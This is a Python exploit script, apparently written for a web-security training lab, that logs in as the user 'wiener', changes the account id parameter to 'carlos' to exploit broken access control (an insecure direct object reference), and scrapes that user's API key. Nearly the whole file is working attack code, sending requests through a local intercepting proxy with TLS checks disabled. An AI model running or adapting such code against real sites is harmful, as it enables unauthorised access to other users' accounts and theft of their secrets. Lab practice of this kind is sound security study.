import requests,argparse,urllib3,sys,re
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def carlos_api_key(s, url):

    # Get CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # login as the wiener user
    print(colored("(+) Logging in as the wiener user...",'blue'))
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    try:
        r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
        res = r.text
        if "Log out" in res:
            print(colored("(+) Successfully logged in as the wiener user.",'green'))

            # Exploit access control vulnerability and access the carlos account
            carlos_url = url + "/my-account?id=carlos"
            r = s.get(carlos_url, verify=False, proxies=proxies)
            res = r.text
            if "carlos" in res:
                print(colored("(+) Successfully accessed Carlos's account!",'green'))
                print(colored("(+) Retrieving the API key...",'blue'))
                api_key = re.search("Your API Key is:(.*)", res).group(1)
                api_key=api_key.split('</div>')[0]
                print('API key is:' + colored(api_key,'green'))
            else:
                print(colored("(-) Could not access Carlos's account.",'red'))
                sys.exit(-1)
        else:
            print(colored("(-) Could not login as the wiener user.",'red'))
            sys.exit(-1)
    except Exception as e:
        print(colored(e,'red'))


def main():

    banner(name='broken access')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    carlos_api_key(s,url)
    
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+a)


if __name__ == "__main__":
    main()